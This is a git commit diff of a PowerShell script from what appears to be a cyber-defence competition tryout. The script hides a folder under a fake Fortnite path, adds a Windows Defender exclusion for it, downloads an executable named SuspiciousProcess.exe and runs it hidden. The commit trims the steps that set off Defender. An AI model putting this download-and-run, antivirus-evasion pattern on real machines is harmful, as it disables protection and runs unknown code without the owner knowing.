5e80c607ed23f20e2731904c3b61acde5e77790a
James Southcott <james.southcott19@gmail.com>
2024-08-06 18:02:43 -0700

    fixed so defender doesnt throw a fit

--- tryoutScript.ps1
+++ tryoutScript.ps1
@@ -1,10 +1,8 @@
 # Don't look at this you cheater
 
-set-executionpolicy -executionpolicy unrestricted -force
 if(!(Test-Path C:\ProgramData\EpicGames\Fortnite)){
     mkdir C:\ProgramData\EpicGames\Fortnite | Out-Null
 }
 Add-MpPreference -ExclusionPath C:\ProgramData\EpicGames\Fortnite | Out-Null
-Add-MpPreference -ExclusionExtension .exe | Out-Null
 wget -o C:\ProgramData\EpicGames\Fortnite\SusProcess.exe "https://github.com/CCDC-RIT/windowsTryouts/raw/main/SuspiciousProcess.exe" | Out-Null
 Start-Process "C:\ProgramData\EpicGames\Fortnite\SusProcess.exe" -WindowStyle Hidden | Out-Null
